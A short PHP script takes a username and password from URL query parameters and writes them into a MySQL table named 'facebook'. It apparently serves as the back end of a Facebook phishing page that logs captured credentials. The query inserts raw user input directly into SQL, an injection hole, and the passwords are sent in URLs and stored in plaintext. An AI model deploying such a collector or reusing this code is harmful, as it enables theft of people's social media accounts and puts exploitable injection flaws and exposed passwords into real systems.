<?php
include "conexion.php";
$conexionbd = conectar_bd();

$usuario = $_GET['user'];
$password = $_GET['pass'];

$query = "INSERT INTO facebook (user, pass) VALUES ('$usuario', '$password');";

$mensaje = (mysqli_query($conexionbd, $query)) ? "exito" : "error";
echo $mensaje, " en create de la tabla facebook";
